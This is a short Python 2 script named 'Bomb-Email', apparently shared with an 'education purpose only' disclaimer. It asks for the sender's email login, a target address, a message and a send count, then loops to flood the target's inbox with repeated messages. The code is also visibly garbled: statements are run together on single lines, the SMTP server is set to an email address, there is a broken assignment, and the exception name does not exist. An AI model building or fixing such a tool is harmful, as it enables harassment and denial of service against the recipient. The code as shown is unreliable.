#!/usr/bin/python
#Bomb-Email
#This code for education purpose only.
#Use it at your own risk !!!

import osimport smtplibimport getpassimport sys print '+=========================+' Author : AbekaPrtm
'+  Facebook : AbekaPrtm
'+=========================+' 

server = raw_input ('Gmail Target')user = raw_input('Emailmu: ')passwd = getpass.getpass('Passwordmu : ')


to = raw_input('\nTo: ')#subject = raw_input('Subject: ') body = raw_input('Pesan : ')total = input('Number of send: ') 

if server == 'gmail':     
 smtp_server = 'abekaprtm@gmail.com' port = 587
 elif server == 'yahoo':                                          smtp_served'abekaprtm@gmail.com' 
port = 25
 else: print 'Applies only to gmail and yahoo.' sys.exit()
print '' 

try: server = smtplib.SMTP(smtp_server,port) server.ehlo() 
 if smtp_server == "abekaprtm@gmail.com":   
 server.starttls() 
server.login(user,passwd) for i in range(1, total+1): 
subject = os.urandom(9) msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body server.sendmail(user,to,msg) print "\rE-mails sent: %i" %i
sys.
stdout.flush() server.quit()
 print '\n Done !!!'
except KeyboardInterrupt: 
 print '[-] Canceled' 
 sys.exit()
except AbekaprtmAuthenticationError: print '\n[!] The username or password you entered is incorrect.' sys.exit()